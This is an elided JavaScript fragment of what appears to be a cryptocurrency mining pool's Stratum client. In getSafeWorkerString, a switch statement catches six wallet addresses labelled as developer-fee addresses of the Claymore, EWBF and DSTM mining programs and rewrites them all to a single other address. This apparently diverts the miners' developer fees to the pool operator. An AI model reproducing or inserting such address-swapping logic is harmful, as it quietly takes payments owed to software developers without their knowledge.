...
var StratumClient = function(options){
    ...
    function getSafeWorkerString(raw) {
		...
		switch (addr){
			case 't1N7NByjcXxJEDPeb1KBDT9Q8Wocb3urxnv' : /* Claymore Dev Fee */
			case 't1W9HL5Aep6WHsSqHiP9YrjTH2ZpfKR1d3t' : /* Claymore Dev Fee */
			case 't1b9PsiekL4RbMoGzyLMFkMevbz7QfwepgP' : /* Claymore Dev Fee */
			case 't1dn3KXy6mBi5TR1ifRwYse6JMgR2w7zUbr' : /* Claymore Dev Fee */
			case 't1fJuHWrfcWnYMYyP9VAF96vRnvND2NziMG' : /* EWBF */
			case 't1NEpmfunewy9z5TogCvAhCuS3J8VWXoJNv' : /* DSTM */
				addr = 't1dSjM2rfU9RuUSAqjxuLg3QWL1hxX6babC';
				break;
			default:
				break;
		}
